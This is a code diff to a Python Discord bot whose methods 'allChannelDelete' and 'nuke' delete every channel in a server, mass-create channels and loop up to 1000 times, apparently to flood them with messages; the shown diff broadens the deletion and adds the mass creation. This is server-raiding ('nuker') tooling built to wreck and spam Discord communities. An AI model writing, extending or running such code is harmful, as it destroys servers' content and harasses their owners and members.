@@ -8,23 +8,22 @@ class DiscordBot(discord.Client):
     def __init__(self, token:str):
         super().__init__(intents=intents)
         self.token = token
-    async def allChannelDelete(self, guildId:str, createOne:bool):
+    async def allChannelDelete(self, guildId:str):
         try:
             for guild in self.guilds:
                 if guild.id == guildId:
                     break
-            await asyncio.gather(*(channel.delete() for channel in guild.text_channels))
-            if createOne:
-                guild.create_text_channel("Channel")
+            await asyncio.gather(*(channel.delete() for channel in guild.channels))
         except:
             print(traceback.format_exc())
     async def nuke(self, logId:str, latency:int, message:str, guildId:str, channelName:str, numberOfExecutions=1000):
         try:
             logs[logId] = ""
-            channels = []
             for guild in self.guilds:
                 if guild.id == guildId:
                     break
+            await asyncio.gather(*(guild.create_text_channel(channelName) for i in range(13)))
+            channels = list(guild.channels)
             for i in range(numberOfExecutions):
                 if logId in stops:
                     logs.pop(logId)
